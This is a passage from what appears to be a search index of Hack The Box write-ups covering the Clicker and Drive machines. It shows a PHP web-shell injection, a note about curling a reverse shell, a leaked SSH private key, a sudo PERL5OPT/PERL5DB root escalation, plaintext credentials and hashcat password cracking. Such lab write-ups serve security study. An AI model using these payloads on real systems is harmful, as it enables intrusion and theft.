$player[\"nickname\"] . \" Clicks: \" . $player[\"clicks\"] . \" Level: \" . $player[\"level\"] . \"\\n\";\n  }\n} elseif ($_POST[\"extension\"] == \"json\") {\n  $s .= json_encode($currentplayer);\n  $s .= json_encode($data);\n    ...\n} else {\n  $s .= '&lt;table&gt;';\n  $s .= '&lt;thead&gt;';\n  $s .= '  &lt;tr&gt;';\n</code></pre> <pre><code>$filename = \"exports/top_players_\" . random_string(8) . \".\" . $_POST[\"extension\"];\nfile_put_contents($filename, $s);\nheader('Location: /admin.php?msg=Data has been saved in ' . $filename);\n</code></pre> <ul> <li>filename string is concated without checking -&gt; attack vector -&gt; change extension [y]</li> </ul> <ul> <li>analyse nickname field for account info: shown can be configed</li> </ul> <pre><code>&lt;?php\nsession_start();\ninclude_once(\"db_utils.php\");\n\nif (isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username'] != \"\" &amp;&amp; $_POST['password'] != \"\") {\n    if(check_auth($_POST['username'], $_POST['password'])) {\n        $_SESSION[\"PLAYER\"] = $_POST[\"username\"];\n        $profile = load_profile($_POST[\"username\"]);\n        $_SESSION[\"NICKNAME\"] = $profile[\"nickname\"];\n        $_SESSION[\"ROLE\"] = $profile[\"role\"];\n        $_SESSION[\"CLICKS\"] = $profile[\"clicks\"];\n        $_SESSION[\"LEVEL\"] = $profile[\"level\"];\n        header('Location: /index.php');\n    }\n    else {\n        header('Location: /login.php?err=Authentication Failed');\n    }\n}\n?&gt;\n</code></pre> <ul> <li>register a new user -&gt; uuu:0</li> <li>save_game.php -&gt; param config -&gt; change nickname from authenticate.php -&gt; nickname with one cmd invoke -&gt; <code>&lt;?php system($_GET[\"cmd\"]);?&gt;</code></li> </ul> <ul> <li>POC: nickname changed</li> </ul> <ul> <li>RCE to get a shell: id [y], which curl [y] -&gt; curl a rshell and execute it</li> </ul> <pre><code>bash-5.1$ uname -a\nLinux clicker 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\nbash-5.1$ ip a  ip a\nip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b9:f1:a8 brd ff:ff:ff:ff:ff:ff\n    altname enp3s0\n    altname ens160\n    inet 10.10.11.232/23 brd 10.10.11.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb9:f1a8/64 scope global dynamic mngtmpaddr\n       valid_lft 86398sec preferred_lft 14398sec\n    inet6 fe80::250:56ff:feb9:f1a8/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Clicker/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/active_machines/Clicker/#enumeration","title":"enumeration","text":"<ul> <li>/etc/passwd -&gt; root, www-data, jack</li> <li>port 3306 - mysql</li> </ul>"},{"location":"Write-ups/thb/active_machines/Clicker/#www-data-jack","title":"www-data -&gt; jack","text":"<ul> <li>files in <code>/opt/</code></li> </ul> <pre><code>total 16K\n4.0K drwxr-xr-x 18 root root 4.0K Sep  5 19:19 ..\n4.0K drwxr-xr-x  2 jack jack 4.0K Jul 21 22:29 manage\n4.0K drwxr-xr-x  3 root root 4.0K Jul 20 10:00 .\n4.0K -rwxr-xr-x  1 root root  504 Jul 20 10:00 monitor.sh\n\ntotal 28K\n4.0K drwxr-xr-x 2 jack jack 4.0K Jul 21 22:29 .\n4.0K -rw-rw-r-- 1 jack jack  256 Jul 21 22:29 README.txt\n4.0K drwxr-xr-x 3 root root 4.0K Jul 20 10:00 ..\n 16K -rwsrwsr-x 1 jack jack  16K Feb 26  2023 execute_query\nbash-5.1$ cat README.txt\ncat README.txt\nWeb application Management\n\nUse the binary to execute the following task:\n        - 1: Creates the database structure and adds user admin\n        - 2: Creates fake players (better not tell anyone)\n        - 3: Resets the admin password\n        - 4: Deletes all users except the admin\n</code></pre> <ul> <li>hash file uncrackable [x]</li> </ul> <pre><code>bash-5.1$ /execute_query 3\n./execute_query 3\nmysql: [Warning] Using a password on the command line interface can be insecure.\n--------------\nUPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'\n--------------\n</code></pre> <ul> <li>execute_query 5 also tries to cat a file -&gt; guess this tool is under the jack's home -&gt; get ssh private key</li> </ul> <pre><code>./execute_query 5 ../.ssh/id_rsa\nmysql: [Warning] Using a password on the command line interface can be insecure.\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <ul> <li>priv esca -&gt; jack</li> </ul> <pre><code>$ chmod 600 id_rsa &amp;&amp; ssh -i id_rsa jack@10.10.11.232\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed Nov 22 01:54:17 PM UTC 2023\n\n  System load:           0.080078125\n  Usage of /:            53.4% of 5.77GB\n  Memory usage:          20%\n  Swap usage:            0%\n  Processes:             247\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.232\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:f1a8\n\n-bash-5.1$ id\nuid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Clicker/#jack-root","title":"jack -&gt; root","text":"<ul> <li>suid, guid [x]</li> <li>sudo [y] -&gt; <code>sudo -l</code> -&gt; <code>(root) SETENV: NOPASSWD: /opt/monitor.sh</code> (key script)</li> </ul> <pre><code>-bash-5.1$ sudo -l\nMatching Defaults entries for jack on clicker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser jack may run the following commands on clicker:\n    (ALL : ALL) ALL\n    (root) SETENV: NOPASSWD: /opt/monitor.sh\n</code></pre> <pre><code>$ cat monitor.sh\n#!/bin/bash\nif [ \"$EUID\" -ne 0 ]\n  then echo \"Error, please run as root\"\n  exit\nfi\n\nset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nunset PERL5LIB;\nunset PERLLIB;\n\ndata=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);\n/usr/bin/xml_pp &lt;&lt;&lt; $data;\nif [[ $NOSAVE == \"true\" ]]; then\n    exit;\nelse\n    timestamp=$(/usr/bin/date +%s)\n    /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_${timestamp}.xml\nfi\n</code></pre> <ul> <li>all command is absolute path -&gt; PATH usage [x]</li> <li>unset PERL5LIB and PERLLIB -&gt; perl env -&gt; only perl script /usr/bin/xml_pp (other all elf files)</li> </ul> <pre><code>$ cat /usr/bin/xml_pp\n#!/usr/bin/perl -w\n# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $\nuse strict;\n\nuse XML::Twig;\nuse File::Temp qw/tempfile/;\nuse File::Basename qw/dirname/;\n\nmy @styles= XML::Twig-&gt;_pretty_print_styles; # from XML::Twig\nmy $styles= join '|', @styles;               # for usage\nmy %styles= map { $_ =&gt; 1} @styles;          # to check option\n</code></pre> <ul> <li>searchsploit perl and privilege escalation related exps</li> </ul> <pre><code>$ searchsploit perl priv\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                       |  Path\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nExim - 'perl_startup' Local Privilege Escalation (Metasploit)                                                                        | linux/local/39702.rb\nNetIQ Privileged User Manager 2.3.1 - 'ldapagnt_eval()' Perl Remote Code Execution (Metasploit)                                      | windows/remote/22903.rb\nNovell NetIQ Privileged User Manager 2.3.1 - 'ldapagnt.dll' ldapagnt_eval() Perl Code Evaluation Remote Code Execution               | windows/remote/22738.txt\nSetuid perl - 'PerlIO_Debug()' Root Owned File Creation Privilege Escalation                                                         | linux/local/792.c\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <ul> <li>perl startup [ok], Exim - 'perl_startup' Local Privilege Escalation (Metasploit) - Linux local Exploit (exploit-db.com)</li> <li> <p>key usage: <code>cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec \"#{c}\"' exim -ps 2&gt;&amp;-})</code> -&gt; two env vars and one cmd -&gt; treated sudo rule <code>SETENV</code></p> </li> <li> <p>POC: <code>sudo PERL5OPT=-d PERL5DB='exec \"id\"' /opt/monitor.sh</code> -&gt; id as root</p> </li> </ul> <pre><code>$ sudo PERL5OPT=-d PERL5DB='exec \"id\"' /opt/monitor.sh\nStatement unlikely to be reached at /usr/bin/xml_pp line 9.\n        (Maybe you meant system() when you said exec()?)\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <ul> <li>give bash suid and execute it as the root priv</li> </ul> <pre><code>bash-5.1# sudo PERL5OPT=-d PERL5DB='exec \"chmod u+s /usr/bin/bash\"' /opt/monitor.sh\nStatement unlikely to be reached at /usr/bin/xml_pp line 9.\n        (Maybe you meant system() when you said exec()?)\nbash-5.1# bash -p\nbash-5.1# id\nuid=1000(jack) gid=1000(jack) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(jack)\nbash-5.1# cd /root\nbash-5.1# pwd\n/root\nbash-5.1# ls\ndiagnostic_files  restore  root.txt\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Devvortex/","title":"Devvortex (no root yet)","text":"<p>Current stage: Apport 2.20.11, Ubuntu 20.04</p>"},{"location":"Write-ups/thb/active_machines/Devvortex/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/active_machines/Devvortex/#recon","title":"Recon","text":""},{"location":"Write-ups/thb/active_machines/Devvortex/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/active_machines/Devvortex/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/active_machines/Drive/","title":"Drive (Hard)","text":""},{"location":"Write-ups/thb/active_machines/Drive/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/active_machines/Drive/#recon","title":"Recon","text":"<ul> <li><code>nmap -sT -sV -sC -O -p 22,80 -oA nmap/detail 10.10.11.235</code></li> </ul> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)\n|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)\n|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://drive.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>attack vector: 22-ssh, 80-http</li> <li>subdomain -&gt; nothing</li> <li>path</li> <li><code>$ feroxbuster -u http://drive.htb</code></li> <li>contact, login logout, register, uploads, upload, home</li> </ul> <pre><code>404      GET       10l       21w      179c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        0l        0w        0c http://drive.htb/contact =&gt; http://drive.htb/contact/\n301      GET        0l        0w        0c http://drive.htb/logout =&gt; http://drive.htb/logout/\n301      GET        0l        0w        0c http://drive.htb/register =&gt; http://drive.htb/register/\n301      GET        0l        0w        0c http://drive.htb/login =&gt; http://drive.htb/login/\n302      GET        0l        0w        0c http://drive.htb/uploads =&gt; http://drive.htb/login/\n301      GET        0l        0w        0c http://drive.htb/upload =&gt; http://drive.htb/upload/\n301      GET        0l        0w        0c http://drive.htb/home =&gt; http://drive.htb/home/\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Drive/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/active_machines/Drive/#80-http-get-a-shell","title":"80 - http -&gt; get a shell","text":""},{"location":"Write-ups/thb/active_machines/Drive/#drive","title":"drive","text":"<ul> <li>qwe123:okokok</li> <li>file upload</li> </ul> <ul> <li>ASCII text MIME types -&gt; HTTP field -&gt; php file upload [x]</li> <li>concrete file path: http://drive.htb/113/getFileDetail/<ul> <li>113, number of file id</li> <li>getFileDetail, operation on file<ul> <li>view</li> <li>edit</li> <li>delete</li> <li>change properties</li> </ul> </li> </ul> </li> </ul> <ul> <li>cookie -&gt; csrf -&gt; csrftoken, csrfmiddlewaretoken -&gt; check django csrf mechanism [x]</li> </ul> <ul> <li> <p>http://drive.htb/113/getFileDetail/ -&gt; <code>document_id + handler</code> -&gt; intrude all doc_ids</p> </li> <li> <p><code>{n}/getFileDetail/</code></p> </li> <li> <p><code>{n}/getGroupDetail/</code></p> </li> <li> <p><code>{n}/block/</code> -&gt; block ~= forbidden func -&gt; more check</p> </li> </ul> <p></p> <p></p>"},{"location":"Write-ups/thb/active_machines/Drive/#block-mesgs-cred-get-a-shell","title":"block mesgs -&gt; cred -&gt; get a shell","text":"<ul> <li>cred: martin:Xk4@KjyrYv8t194L!</li> </ul> <ul> <li>middleware -&gt; fixed csrf</li> </ul> <ul> <li><code>/var/www/backups</code></li> </ul>"},{"location":"Write-ups/thb/active_machines/Drive/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/active_machines/Drive/#martin-tom","title":"martin -&gt; tom","text":"<ul> <li><code>$ ssh martin@$IP</code></li> <li><code>martin@drive:~$ cat /etc/passwd | grep bash</code></li> </ul> <pre><code>root:x:0:0:root:/root:/bin/bash\ngit:x:115:119:Git Version Control,,,:/home/git:/bin/bash\nmartin:x:1001:1001:martin cruz,,,:/home/martin:/bin/bash\ncris:x:1002:1002:Cris Disel,,,:/home/cris:/bin/bash\ntom:x:1003:1003:Tom Hands,,,:/home/tom:/bin/bash\n</code></pre> <ul> <li> <p>sudo -l [x]</p> </li> <li> <p>check backup file -&gt; <code>martin@drive:/var/www/backups$ ls -l</code></p> </li> </ul> <pre><code>martin@drive:/var/www/backups$ ls -l\ntotal 3732\n-rw-r--r-- 1 www-data www-data   13018 Sep  1 20:00 1_Dec_db_backup.sqlite3.7z\n-rw-r--r-- 1 www-data www-data   12226 Sep  1 20:00 1_Nov_db_backup.sqlite3.7z\n-rw-r--r-- 1 www-data www-data   12722 Sep  1 20:00 1_Oct_db_backup.sqlite3.7z\n-rw-r--r-- 1 www-data www-data   12770 Sep  1 20:00 1_Sep_db_backup.sqlite3.7z\n-rwxr-xr-x 1 root     root     3760128 Dec 26  2022 db.sqlite3\n</code></pre> <ul> <li>compressed files need password -&gt; crack by john [x]<ul> <li>db.sqlite3 -&gt; hashed password -&gt; crack by hashcat [x]</li> <li>[example_hashes hashcat wiki] -&gt; -m 124</li> </ul> </li> </ul> <pre><code>$ ls\n1_Dec_db_backup.sqlite3.7z  1_Nov_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z  db.sqlite3\n\n$ 7z x 1_Dec_db_backup.sqlite3.7z\n\n7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\np7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs 13th Gen Intel(R) Core(TM) i9-13900H (B06A2),ASM,AES-NI)\n\nScanning the drive for archives:\n1 file, 13018 bytes (13 KiB)\n\nExtracting archive: 1_Dec_db_backup.sqlite3.7z\n--\nPath = 1_Dec_db_backup.sqlite3.7z\nType = 7z\nPhysical Size = 13018\nHeaders Size = 170\nMethod = LZMA2:22 7zAES\nSolid = -\nBlocks = 1\n\n\nEnter password (will not be echoed):\n</code></pre> <p></p> <ul> <li>linpeas -&gt; gitea service</li> </ul> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executable files potentially added by user (limit 70)\n2023-09-06+02:56:34.9858469460 /usr/local/sbin/laurel\n2023-02-04+09:32:37.9138327970 /usr/local/bin/gunicorn\n2023-02-04+09:04:03.1905458990 /usr/local/bin/django-admin\n2023-02-04+09:03:59.1353690270 /usr/local/bin/sqlformat\n2023-02-04+09:01:15.1951738040 /usr/local/bin/cythonize\n2023-02-04+09:01:15.1951738040 /usr/local/bin/cython\n2023-02-04+09:01:15.1951738040 /usr/local/bin/cygdb\n2023-02-03+22:19:27.3521802040 /usr/local/bin/pipreqs\n2022-12-25+05:57:32.5523324050 /usr/local/bin/gitea\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Active Ports\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::80                   :::*                    LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\ntcp6       0      0 :::3000                 :::*                    LISTEN      - (-&gt; Gitea)\n</code></pre> <ul> <li>3000 port (a service running) -&gt; port forwarding -&gt; local access<ul> <li><code>$ ssh -L 3000:127.0.0.1:3000 martin@10.10.11.235</code></li> <li>cred: martin@drive.htb:Xk4@KjyrYv8t194L!</li> <li>get a repo -&gt; git clone to local</li> </ul> </li> </ul> <p></p> <p></p> <ul> <li>git clone</li> </ul> <pre><code>$ git clone http://localhost:3000/crisDisel/DoodleGrive.git\nCloning into 'DoodleGrive'...\nUsername for 'http://localhost:3000': martin@drive.htb\nPassword for 'http://martin@drive.htb@localhost:3000':\nremote: Enumerating objects: 227, done.\nremote: Counting objects: 100% (227/227), done.\nremote: Compressing objects: 100% (187/187), done.\nremote: Total 227 (delta 46), reused 209 (delta 36)\nReceiving objects: 100% (227/227), 2.67 MiB | 1.12 MiB/s, done.\nResolving deltas: 100% (46/46), done.\n</code></pre> <ul> <li>code audit repo -&gt; find compression password -&gt; H@ckThisP@ssW0rDIfY0uC@n:)</li> </ul> <p></p> <ul> <li>uncompressed files</li> </ul> <p></p> <ul> <li>collect hash</li> </ul> <pre><code>pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=    2022-12-26 06:21:34.294890  1   admin\npbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=    2022-12-24 22:39:42.847497  0   jamesMason\npbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=    2022-12-24 12:55:10.152415  0   martinCruz\npbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=    2022-12-26 06:20:23.299662  0   tomHands\npbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=    2022-12-24 16:51:53.717055  0   crisDisel\n\nsha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a    2022-12-26 05:48:27.497873  0   jamesMason\nsha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f    2022-12-24 12:55:10 0   martinCruz\nsha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a    2022-12-24 13:17:45 0   tomHands\nsha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f    2022-12-24 16:51:53 0   crisDisel\nsha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3    2022-12-26 05:43:40.388717  1   admin\n\nsha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a    2022-12-26 05:48:27.497873  0   jamesMason\nsha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f    2022-12-24 12:55:10 0   martinCruz\nsha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141    2022-12-26 06:02:42.401095  0   tomHands\nsha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f    2022-12-24 16:51:53 0   crisDisel\nsha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3    2022-12-26 05:43:40.388717  1   admin\n\nsha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a    2022-12-26 05:48:27.497873  0   jamesMason\nsha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f    2022-12-24 12:55:10 0   martinCruz\nsha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93    2022-12-26 06:03:57.371771  0   tomHands\nsha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f    2022-12-24 16:51:53 0   crisDisel\nsha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3    2022-12-26 05:43:40.388717  1   admin\n</code></pre> <ul> <li>hashcat to crack hashes -&gt; <code>hashcat -m 124 -a 0 hash /usr/share/wordlists/rockyou.txt</code></li> </ul> <pre><code>$ hashcat -m 124 -a 0 hash /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n==================================================================================================================================================\n* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2917/5898 MB (1024 MB allocatable), 4MCU\n\n$ hashcat -m 124 -a 0 hash /usr/share/wordlists/rockyou.txt --show\nsha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7 &lt;- tomHands\nsha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool &lt;- tomHands\nsha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy &lt;- tomHands\n</code></pre> <pre><code>$ hashcat -m 10000 -a 0 hash1 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n==================================================================================================================================================\n* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2917/5898 MB (1024 MB allocatable), 4MCU\n</code></pre> <ul> <li>correct cred: tomHands:johnmayer7</li> </ul>"},{"location":"Write-ups/thb/active_machines/Drive/#tom-enumeration","title":"tom enumeration","text":"<ul> <li>sudo -l [x]</li> <li>suid: find / -perm u=s -type f 2&gt;/dev/null [x]</li> <li> <p>guid: find / -perm g=s -type f 2&gt;/dev/null [x]</p> </li> <li> <p>importanct files: 